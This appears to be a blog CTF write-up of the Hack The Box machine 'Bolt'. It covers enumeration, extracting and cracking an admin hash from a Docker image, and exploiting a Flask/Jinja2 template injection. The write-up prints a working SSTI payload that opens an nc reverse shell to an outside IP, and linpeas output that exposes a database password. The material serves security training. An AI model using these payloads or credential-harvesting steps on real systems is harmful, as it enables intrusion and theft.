<!DOCTYPE html><html lang="en" data-mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Bolt writeup" /><meta property="og:locale" content="en" /><meta name="description" content="Summary Bolt is a box which is mainly centered around forensics and enumeration, especially when it comes to Docker. However techniques such as source code analysis and SSTI exploitation is also present in this box." /><meta property="og:description" content="Summary Bolt is a box which is mainly centered around forensics and enumeration, especially when it comes to Docker. However techniques such as source code analysis and SSTI exploitation is also present in this box." /><link rel="canonical" href="https://bitisg.github.io/posts/Bolt/" /><meta property="og:url" content="https://bitisg.github.io/posts/Bolt/" /><meta property="og:site_name" content="BitisGabonica" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-06-17T20:00:00+02:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Bolt writeup" /><meta name="twitter:site" content="@BitisGabonica1" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-06-21T17:14:00+02:00","datePublished":"2022-06-17T20:00:00+02:00","description":"Summary Bolt is a box which is mainly centered around forensics and enumeration, especially when it comes to Docker. However techniques such as source code analysis and SSTI exploitation is also present in this box.","headline":"Bolt writeup","mainEntityOfPage":{"@type":"WebPage","@id":"https://bitisg.github.io/posts/Bolt/"},"url":"https://bitisg.github.io/posts/Bolt/"}</script><title>Bolt writeup | BitisGabonica</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="BitisGabonica"><meta name="application-name" content="BitisGabonica"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src=" /assets/img/sui.png " alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">BitisGabonica</a></div><div class="site-subtitle font-italic">CTF writeups and other stuff</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <a href="https://github.com/BitisG" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://twitter.com/BitisGabonica1" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['0xBitisGabonica','protonmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Bolt writeup</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 1000 400'%3E%3C/svg%3E" data-src="/assets/img/boxes/bolt/Bolt.png" class="preview-img bg" alt="Preview Image" width="1000" height="400" data-proofer-ignore><h1 data-toc-skip>Bolt writeup</h1><div class="post-meta text-muted"><div> By <em> <a href="https://twitter.com/BitisGabonica1">BitisGabonica</a> </em></div><div class="d-flex"><div> <span> Posted <em class="timeago" data-ts="1655488800" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-06-17 </em> </span> <span> Updated <em class="timeago" data-ts="1655824440" data-toggle="tooltip" data-placement="bottom" data-tooltip-df="llll" > 2022-06-21 </em> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2174 words"> <em>12 min</em> read</span></div></div></div><div class="post-content"><h2 id="summary"><span class="mr-2">Summary</span><a href="#summary" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Bolt is a box which is mainly centered around forensics and enumeration, especially when it comes to Docker. However techniques such as source code analysis and SSTI exploitation is also present in this box.</p><h2 id="foothold"><span class="mr-2">Foothold</span><a href="#foothold" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Let’s start out with a nmap scan:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
</pre><td class="rouge-code"><pre><span class="gp">#</span><span class="w"> </span>Nmap 7.92 scan initiated Wed Jan 19 11:49:56 2022 as: nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p-</span> <span class="nt">-o</span> nmap/full.txt 10.129.165.25
<span class="go">Nmap scan report for 10.129.165.25
Host is up (0.049s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
</span><span class="gp">22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux;</span><span class="w"> </span>protocol 2.0<span class="o">)</span>
<span class="go">| ssh-hostkey: 
|   3072 4d:20:8a:b2:c2:8c:f5:3e:be:d2:e8:18:16:28:6e:8e (RSA)
|   256 7b:0e:c7:5f:5a:4c:7a:11:7f:dd:58:5a:17:2f:cd:ea (ECDSA)
|_  256 a7:22:4e:45:19:8e:7d:3c:bc:df:6e:1d:6c:4f:41:56 (ED25519)
80/tcp  open  http     nginx 1.18.0 (Ubuntu)
|_http-title:     Starter Website -  About 
|_http-server-header: nginx/1.18.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.18.0 (Ubuntu)
| http-title: Passbolt | Open source password manager for teams
|_Requested resource was /auth/login?redirect=%2F
| ssl-cert: Subject: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU
| Not valid before: 2021-02-24T19:11:23
|_Not valid after:  2022-02-24T19:11:23
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
</span><span class="gp">Service Info: OS: Linux;</span><span class="w"> </span>CPE: cpe:/o:linux:linux_kernel
<span class="go">
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span><span class="gp">#</span><span class="w"> </span>Nmap <span class="k">done </span>at Wed Jan 19 11:52:53 2022 <span class="nt">--</span> 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>176.70 seconds
<span class="go">
</span></pre></table></code></div></div><p>Based on the output we know that the box is hosting a webpage with the domain name passbolt.bolt.htb. We can add both this domain and also bolt.htb to our <code class="language-plaintext filepath highlighter-rouge">/etc/hosts</code> file.</p><p>Since the machine uses subdomains, it might be interesting to see if we can find others.</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>gobuster vhost <span class="nt">-u</span> bolt.htb <span class="nt">-w</span> /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt                                                                                                                          2 ⨯
<span class="go">===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:          http://bolt.htb
[+] Method:       GET
[+] Threads:      10
[+] Wordlist:     /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:   gobuster/3.1.0
[+] Timeout:      10s
===============================================================
2022/06/17 21:20:32 Starting gobuster in VHOST enumeration mode
===============================================================
Found: mail.bolt.htb (Status: 200) [Size: 4943]
Found: demo.bolt.htb (Status: 302) [Size: 219] 
                                               
===============================================================
2022/06/17 21:21:47 Finished
===============================================================
</span></pre></table></code></div></div><p>Let’s add these to our host file as well.</p><p>We start by taking a look at the webpage hosted with the passbolt.bolt.htb domain:</p><p><img data-src="/assets/img/boxes/bolt/passbolt.png" alt="The passbolt page" data-proofer-ignore></p><p>Before we can continue here we need a valid email from the bolt organization presumably. Since this is the case let’s move on to the application hosted on port 80:</p><p><img data-src="/assets/img/boxes/bolt/bestwelcome.png" alt="The welcome page for the web application hosted on port 80" data-proofer-ignore></p><p>The page contains a download tab where we can download a docker image from the organization. Other than that there is nothing else that is eye catching. The other simply display a login screen:</p><p><img data-src="/assets/img/boxes/bolt/demo.png" alt="The login screen for demo.bolt.htb" data-proofer-ignore> <img data-src="/assets/img/boxes/bolt/mail.png" alt="The login screen for mail.bolt.htb" data-proofer-ignore></p><p>Let’s take a look at the downloaded docker image. I used Dive for this:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="go">dive docker-archive://image.tar
</span></pre></table></code></div></div><p>We need to remember to specify that we are analyzing a docker archive, otherwise the tool will try to pull the image, which in this case it will not be able to.</p><p><img data-src="/assets/img/boxes/bolt/dive.png" alt="Dive terminal while analyzing image.tar" data-proofer-ignore></p><p>While using Dive, we can use tab to switch between the tab controlling the layers we are analyzing and the tab containing the files in that layer. While the file tab is in use we can pres <code class="language-plaintext highlighter-rouge">ctrl+U</code> to only show modified files. If we take a look at the layer with the id <code class="language-plaintext highlighter-rouge">a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2</code> we can see that a sqlite3 database was added. Let’s unzip the image and take a further look at that layer.</p><p>Once the image has been untarred and the layer also untarred, we can access the sqlite3 database:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>sqlite3 db.sqlite3                                                                                                                                                                            
<span class="go">SQLite version 3.38.5 2022-05-06 15:25:27
Enter ".help" for usage hints.
</span><span class="gp">sqlite&gt;</span><span class="w"> </span>.tables
<span class="go">User
</span><span class="gp">sqlite&gt;</span><span class="w"> </span><span class="k">select</span> <span class="k">*</span> from User<span class="p">;</span>
<span class="gp">1|admin|admin@bolt.htb|$</span>1<span class="nv">$sm1RceCh$rSd3PygnS</span>/6jlFDfF2J5q.||
<span class="gp">sqlite&gt;</span><span class="w"> 
</span></pre></table></code></div></div><p>We now have the hash for the admin user! The question is just for which service exactly. Before we start thinking about that let’s crack the hash:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>hashid hash2.txt                                               
<span class="go">--File 'hash2.txt'--
</span><span class="gp">Analyzing '$</span>1<span class="nv">$sm1RceCh$rSd3PygnS</span>/6jlFDfF2J5q.<span class="s1">'
</span><span class="go">[+] MD5 Crypt 
[+] Cisco-IOS(MD5) 
[+] FreeBSD MD5 
--End of file 'hash2.txt'--   
</span></pre></table></code></div></div><p>the hash was identified as MD5 Crypt. Below is the relevant output from hashcat:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>hashcat <span class="nt">-a</span> 0 <span class="nt">-m</span> 500 hash2.txt /usr/share/wordlists/rockyou.txt
<span class="go">Host memory required for this attack: 2 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

</span><span class="gp">$</span>1<span class="nv">$sm1RceCh$rSd3PygnS</span>/6jlFDfF2J5q.:deadbolt
</pre></table></code></div></div><p>The password lets us login to the bolt.htb site, and we are greeted with the admin panel:</p><p><img data-src="/assets/img/boxes/bolt/adminpanel_bolt.png" alt="The admin panel for bolt.htb" data-proofer-ignore></p><p>The admin panel also contains a conversation between the admin and a user named Sarah:</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>Hi Sarah, did you have time to check over the docker image? If not I'll get Eddie to take a look over. Our security team had a concern with it - something about e-mail? 

I have been so busy with the design I didn't have time yet, I think Eddie's help is required! Our demo is currently restricted to invite only. 

Ok, I will get Eddie to take a look over. I just want to be sure that the Docker image is safe to use. 

Not a problem, thanks for lending a hand! Make sure the image is scrubbed before hosting it! 
</pre></table></code></div></div><p>So to get access to the demo subdomain we need an invite. Let’s take a look at the different layers in the Docker again.</p><p><img data-src="/assets/img/boxes/bolt/dive4.png" alt="The Dive terminal again" data-proofer-ignore></p><p>As we can see in the image, the layer with id <code class="language-plaintext highlighter-rouge">41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad</code> is the layer where the base application was first added, where files such as <code class="language-plaintext filepath highlighter-rouge">routes.py</code> and <code class="language-plaintext filepath highlighter-rouge">forms.py</code> were later removed in future layers.</p><p>Let’s take a look at these files and see if we can find anything interesting. Luckily for us, the layer contains the code for both the demo and mail application! Below are relevant snippets.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
</pre><td class="rouge-code"><pre><span class="o">@</span><span class="n">blueprint</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/register'</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s">'GET'</span><span class="p">,</span> <span class="s">'POST'</span><span class="p">])</span>
<span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
    <span class="n">login_form</span> <span class="o">=</span> <span class="n">LoginForm</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">)</span>
    <span class="n">create_account_form</span> <span class="o">=</span> <span class="n">CreateAccountForm</span><span class="p">(</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">)</span>
    <span class="k">if</span> <span class="s">'register'</span> <span class="ow">in</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">:</span>

        <span class="n">username</span>  <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'username'</span><span class="p">]</span>
        <span class="n">email</span>     <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'email'</span>   <span class="p">]</span>
        <span class="n">code</span>      <span class="o">=</span> <span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">[</span><span class="s">'invite_code'</span><span class="p">]</span>
        <span class="k">if</span> <span class="n">code</span> <span class="o">!=</span> <span class="s">'XNSS-HSJW-3NGU-8XTJ'</span><span class="p">:</span>
            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'code-500.html'</span><span class="p">)</span>
        <span class="n">data</span> <span class="o">=</span> <span class="n">User</span><span class="p">.</span><span class="n">query</span><span class="p">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">email</span><span class="o">=</span><span class="n">email</span><span class="p">).</span><span class="n">first</span><span class="p">()</span>
        <span class="k">if</span> <span class="n">data</span> <span class="ow">is</span> <span class="bp">None</span> <span class="ow">and</span> <span class="n">code</span> <span class="o">==</span> <span class="s">'XNSS-HSJW-3NGU-8XTJ'</span><span class="p">:</span>
            <span class="c1"># Check usename exists
</span>            <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="p">.</span><span class="n">query</span><span class="p">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">username</span><span class="p">).</span><span class="n">first</span><span class="p">()</span>
            <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span> <span class="s">'accounts/register.html'</span><span class="p">,</span> 
                                    <span class="n">msg</span><span class="o">=</span><span class="s">'Username already registered'</span><span class="p">,</span>
                                    <span class="n">success</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span>
                                    <span class="n">form</span><span class="o">=</span><span class="n">create_account_form</span><span class="p">)</span>

            <span class="c1"># Check email exists
</span>            <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="p">.</span><span class="n">query</span><span class="p">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">email</span><span class="o">=</span><span class="n">email</span><span class="p">).</span><span class="n">first</span><span class="p">()</span>
            <span class="k">if</span> <span class="n">user</span><span class="p">:</span>
                <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span> <span class="s">'accounts/register.html'</span><span class="p">,</span> 
                                    <span class="n">msg</span><span class="o">=</span><span class="s">'Email already registered'</span><span class="p">,</span> 
                                    <span class="n">success</span><span class="o">=</span><span class="bp">False</span><span class="p">,</span>
                                    <span class="n">form</span><span class="o">=</span><span class="n">create_account_form</span><span class="p">)</span>

            <span class="c1"># else we can create the user
</span>            <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="p">(</span><span class="o">**</span><span class="n">request</span><span class="p">.</span><span class="n">form</span><span class="p">)</span>
            <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">add</span><span class="p">(</span><span class="n">user</span><span class="p">)</span>
            <span class="n">db</span><span class="p">.</span><span class="n">session</span><span class="p">.</span><span class="n">commit</span><span class="p">()</span>

            <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span> <span class="s">'accounts/register.html'</span><span class="p">,</span> 
                                <span class="n">msg</span><span class="o">=</span><span class="s">'User created please &lt;a href="/login"&gt;login&lt;/a&gt;'</span><span class="p">,</span> 
                                <span class="n">success</span><span class="o">=</span><span class="bp">True</span><span class="p">,</span>
                                <span class="n">form</span><span class="o">=</span><span class="n">create_account_form</span><span class="p">)</span>

    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span> <span class="s">'accounts/register.html'</span><span class="p">,</span> <span class="n">form</span><span class="o">=</span><span class="n">create_account_form</span><span class="p">)</span>
</pre></table></code></div></div><p>This snippet contains the code needed to register an account on the demo application. When we register our account we might notice that we can use the same account on the mail application, so let’s take a look a snippet from that application as well.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="o">@</span><span class="n">blueprint</span><span class="p">.</span><span class="n">route</span><span class="p">(</span><span class="s">'/confirm/changes/&lt;token&gt;'</span><span class="p">)</span>
<span class="k">def</span> <span class="nf">confirm_changes</span><span class="p">(</span><span class="n">token</span><span class="p">):</span>
    <span class="s">"""Confirmation Token"""</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">email</span> <span class="o">=</span> <span class="n">ts</span><span class="p">.</span><span class="n">loads</span><span class="p">(</span><span class="n">token</span><span class="p">,</span> <span class="n">salt</span><span class="o">=</span><span class="s">"changes-confirm-key"</span><span class="p">,</span> <span class="n">max_age</span><span class="o">=</span><span class="mi">86400</span><span class="p">)</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">abort</span><span class="p">(</span><span class="mi">404</span><span class="p">)</span>
    <span class="n">user</span> <span class="o">=</span> <span class="n">User</span><span class="p">.</span><span class="n">query</span><span class="p">.</span><span class="n">filter_by</span><span class="p">(</span><span class="n">username</span><span class="o">=</span><span class="n">email</span><span class="p">).</span><span class="n">first_or_404</span><span class="p">()</span>
    <span class="n">name</span> <span class="o">=</span> <span class="n">user</span><span class="p">.</span><span class="n">profile_update</span>
    <span class="n">template</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">'templates/emails/update-name.html'</span><span class="p">,</span> <span class="s">'r'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span>
    <span class="n">msg</span> <span class="o">=</span> <span class="n">Message</span><span class="p">(</span>
            <span class="n">recipients</span><span class="o">=</span><span class="p">[</span><span class="sa">f</span><span class="s">'</span><span class="si">{</span><span class="n">user</span><span class="p">.</span><span class="n">email</span><span class="si">}</span><span class="s">'</span><span class="p">],</span>
            <span class="n">sender</span> <span class="o">=</span> <span class="s">'support@example.com'</span><span class="p">,</span>
            <span class="n">reply_to</span> <span class="o">=</span> <span class="s">'support@example.com'</span><span class="p">,</span>
            <span class="n">subject</span> <span class="o">=</span> <span class="s">"Your profile changes have been confirmed."</span>
        <span class="p">)</span>
    <span class="n">msg</span><span class="p">.</span><span class="n">html</span> <span class="o">=</span> <span class="n">render_template_string</span><span class="p">(</span><span class="n">template</span> <span class="o">%</span> <span class="n">name</span><span class="p">)</span>
    <span class="n">mail</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">msg</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">render_template</span><span class="p">(</span><span class="s">'index.html'</span><span class="p">)</span>
</pre></table></code></div></div><p>As can be seen in the snippet above, the application takes the updated name and inserts it into the the template without any checks. This is SSTI and worst case scenario it leads to code execution on the system hosting the application. More details can be found <a href="https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee">here</a> and <a href="https://blog.nvisium.com/p263">here</a>.</p><p>If we change our name on the demo application we can see that we have code execution via the mail application.</p><p><img data-src="/assets/img/boxes/bolt/changename.png" alt="Changing the name of our profile in demo app" data-proofer-ignore></p><p><img data-src="/assets/img/boxes/bolt/sstires.png" alt="SSTI confirmed via mail app" data-proofer-ignore></p><p>We can use the SSTI to execute code. In our case we’ll use a reverse shell payload.</p><div class="language-python highlighter-rouge"><div class="code-header"> <span data-label-text="Python"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="p">{{</span> <span class="bp">self</span><span class="p">.</span><span class="n">_TemplateReference__context</span><span class="p">.</span><span class="n">cycler</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span><span class="p">.</span><span class="n">os</span><span class="p">.</span><span class="n">popen</span><span class="p">(</span><span class="s">'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.17.182 1337 &gt;/tmp/f'</span><span class="p">).</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
</pre></table></code></div></div><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre><span class="gp">$</span><span class="w"> </span>nc <span class="nt">-lvnp</span> 1337
<span class="go">listening on [any] 1337 ...
connect to [10.10.17.182] from (UNKNOWN) [10.129.86.187] 51288
</span><span class="gp">/bin/sh: 0: can't access tty;</span><span class="w"> </span>job control turned off
<span class="gp">$</span><span class="w"> </span><span class="nb">id</span>
<span class="go">uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class="gp">$</span><span class="w"> 
</span></pre></table></code></div></div><h2 id="pivot"><span class="mr-2">Pivot</span><a href="#pivot" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2></h2><p>Now that we have a shell on the system we should try to leverage that into getting access to a user account. In this case i simply ran linpeas:</p><div class="language-console highlighter-rouge"><div class="code-header"> <span data-label-text="Console"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre><span class="go">╔══════════╣ Analyzing Passbolt Files (limit 70)
-rw-r----- 1 root www-data 3128 Feb 25  2021 /etc/passbolt/passbolt.php                                                                                                                                                                     
 * Passbolt ~ Open source password manager for teams
</span><span class="gp">            'host' =&gt;</span><span class="w"> </span><span class="s1">'localhost'</span>,
<span class="gp">            'port' =&gt;</span><span class="w"> </span><span class="s1">'3306'</span>,
<span class="gp">            'username' =&gt;</span><span class="w"> </span><span class="s1">'passbolt'</span>,
<span class="gp">            'password' =&gt;</span><span class="w"> </span><span class="s1">'rT2;jW7&lt;eY8!dX8}pQ8%'</span>,
<span class="gp">            'database' =&gt;</span><span class="w"> </span><span class="s1">'passboltdb'</span>,
<span class="go">
